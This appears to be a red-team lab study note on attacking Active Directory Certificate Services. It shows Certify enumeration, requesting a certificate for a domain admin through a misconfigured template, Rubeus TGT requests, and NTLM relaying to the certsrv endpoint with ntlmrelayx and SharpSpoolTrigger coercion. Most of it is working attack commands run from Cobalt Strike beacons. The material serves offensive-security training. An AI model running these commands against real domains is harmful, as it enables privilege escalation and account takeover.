# Enumeration

## Finding Certificate Authorities

To find AD CS Certificate Authorities (CA's) in a domain or forest, run [Certify](https://github.com/GhostPack/Certify) with the cas parameter.

```powershell
# Native
Certify.exe cas
# Cobalt Strike
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
```

## Misconfigured Certificate Templates

AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.

Certify can also find vulnerable templates.

{% code overflow="wrap" %}
```powershell
# Native
Certify.exe find /vulnerable
# Cobalt Strike
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/customuser.webp" alt=""><figcaption></figcaption></figure>

Let's go through the key parts of this output.

1. This template is served by _sub-ca_.
2. The template is called _CustomUser_.
3. _ENROLLEE\_SUPPLIES\_SUBJECT_ is enabled, which allows the certificate requestor to provide any SAN (subject alternative name).
4. The certificate usage has _Client Authentication_ set.
5. _DEV\Domain Users_ have enrollment rights, so any domain user may request a certificate from this template.

**If a principal you control has WriteOwner, WriteDacl or WriteProperty, then this could also be abused.**

This configuration allows any domain user to request a certificate for any other domain user (including a domain admin) and use it for authentication. Request a certificate for nlamb.

{% code overflow="wrap" %}
```powershell
# Get Current user.
beacon> getuid
[*] You are DEV\bfarmer
# Get certificate for a different user. 
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
# Copy the whole certificate (both the private key and certificate) and save it to cert.pem on Ubuntu WSL.  Then use the provided openssl command to convert it to pfx format.
ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password: pass123
Verifying - Enter Export Password: pass123
# Convert cert.pfx into a base64 encoded string so it can be used with Rubeus.
ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0
MIIM7w[...]ECAggA
# Then use asktgt to request a TGT for the user using the certificate.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap
```
{% endcode %}

## NTLM Relaying to ADCS HTTP Endpoints

AD CS services support HTTP enrolment methods and even includes a GUI.  This endpoint is usually found at _http\[s]://\<hostname>/certsrv_**.**

<figure><img src="../../../.gitbook/assets/certsrv.webp" alt=""><figcaption></figcaption></figure>

If NTLM authentication is enabled, these endpoints are vulnerable to NTLM relay attacks.  A common abuse method is to coerce a domain controller to authenticate to an attacker-controlled location, relay the request to a CA to obtain a certificate for that DC, and then use it to obtain a TGT.

An important aspect to be aware of is that you cannot relay NTLM authentication back to the originating machine.  We therefore wouldn't be able to relay a DC to a CA if those services were running on the same machine.  This is indeed the case in the RTO lab, as each CA is running on a DC.

Another good way to abuse this primitive is by gaining access to a machine configured for unconstrained delegation.

To achieve this, we need:

* PortBender on Workstation 2 to capture traffic on port 445 and redirect it to port 8445.
* A reverse port forward to forward traffic hitting port 8445 to the team server on port 445.
* A SOCKS proxy for ntlmrelayx to send traffic back into the network.

The ntlmrelayx command needs to target the `certfnsh.asp` page on the ADCS server.

{% code overflow="wrap" %}
```bash
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```
{% endcode %}

Then force the authentication to occur from WEB to WKSTN-2.

{% code overflow="wrap" %}
```powershell
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102
```
{% endcode %}

The S4U2Self trick can be used to obtain usable TGS's to move laterally to it.
